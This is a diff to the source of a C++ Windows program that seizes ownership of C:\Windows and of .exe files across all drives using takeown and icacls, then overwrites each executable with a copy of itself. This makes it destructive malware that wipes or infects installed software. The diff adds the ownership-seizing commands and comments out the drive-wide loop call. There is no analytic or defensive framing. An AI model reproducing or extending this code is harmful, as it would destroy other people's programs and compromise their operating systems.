@@ -10,6 +10,7 @@
 using namespace std;
 string sWords[] = {"Lol","Mitze","Katze"};
 string Chain = "";
+string youser = getenv("username");
 
 void FckFiles(std::string directory, std::string fileFilter, bool recursively = true)
 {
@@ -48,6 +49,7 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 				string Butter = "copy C:\\mitze.exe /Y "+ string(Chickfila);
 				const char* Sucker2 = Dutter.c_str();
 				const char* Sucker3 = Butter.c_str();
+				system((string("takeown /f "+string(Chickfila))).c_str());
 				system(("icacls "+string(Chickfila)+" /grant \045USERNAME\045:F").c_str());
 				//system(("del /f  "+ string(Chickfila)).c_str());
 				system(("copy C:\\mitze.exe /Y "+ string(Chickfila)).c_str());
@@ -88,13 +90,14 @@ int main(int argc, char* argv[])
     // assigning value to string s 
     string abc = "abcdefghijklmnopqrstuvwxyz"; 
     char char_array[abc.length() + 1]; 
-    strcpy(char_array, abc.c_str()); 
-	system((string("icacls C:\\Windows /grant \045USERNAME\045:F")).c_str());
+    strcpy(char_array, abc.c_str());
+    system((string("takeown /f C:\\Windows")).c_str());
+	system((string("icacls C:\\Windows /grant \""+youser+"\":F")).c_str());
 	CopyFile("./a.exe","C:/mitze.exe",0);
 	CopyFile("./meow.mp3","C:/meow.mp3",0);
 	for(int i=0;i<abc.length();i++){
 
-		FckFiles(string(1,toupper(char_array[i]))+":/","*.exe");
+		//FckFiles(string(1,toupper(char_array[i]))+":/","*.exe");
 	}
 
 }
